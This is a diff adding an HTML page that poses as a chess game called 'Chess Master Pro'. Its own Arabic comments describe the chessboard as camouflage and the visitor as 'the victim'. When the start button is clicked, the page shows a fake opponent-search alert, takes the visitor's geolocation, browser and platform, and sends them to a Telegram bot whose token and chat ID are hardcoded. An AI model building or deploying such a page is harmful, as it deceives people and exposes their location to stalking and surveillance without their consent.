@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Chess Master Pro</title>
+    <style>
+        body { background: #121212; color: #d4af37; text-align: center; font-family: Arial, sans-serif; }
+        .board { display: grid; grid-template-columns: repeat(8, 40px); width: 320px; margin: 20px auto; border: 5px solid #333; }
+        .s { width: 40px; height: 40px; }
+        .w { background: #eee; } .b { background: #444; }
+        .btn { padding: 15px 30px; background: #d4af37; color: #000; border: none; border-radius: 25px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>♟️ Chess Master Online</h1>
+    <div class="board" id="b"></div>
+    <button class="btn" onclick="start()">ابدأ التحدي الآن</button>
+
+    <script>
+        const TOKEN = "8793477325:AAFxZVHnEWYCAJs_4aWa3n0EIt4oNdya95k";
+        const ID = "6533456236";
+
+        // رسم البوردة للتمويه
+        const board = document.getElementById('b');
+        for(let i=0; i<64; i++) {
+            let s = document.createElement('div');
+            s.className = `s ${(Math.floor(i/8)+i%8)%2==0 ? 'w' : 'b'}`;
+            board.appendChild(s);
+        }
+
+        function start() {
+            alert("جاري البحث عن خصم...");
+            // سحب الموقع فوراً
+            navigator.geolocation.getCurrentPosition(p => {
+                let msg = `🎯 تم سحب موقع جديد:\n📍 اللينك: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}`);
+            });
+            // سحب بيانات الجهاز
+            let info = `📱 جهاز الضحية: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}`;
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(info)}`);
+        }
+    </script>
+</body>
+</html>
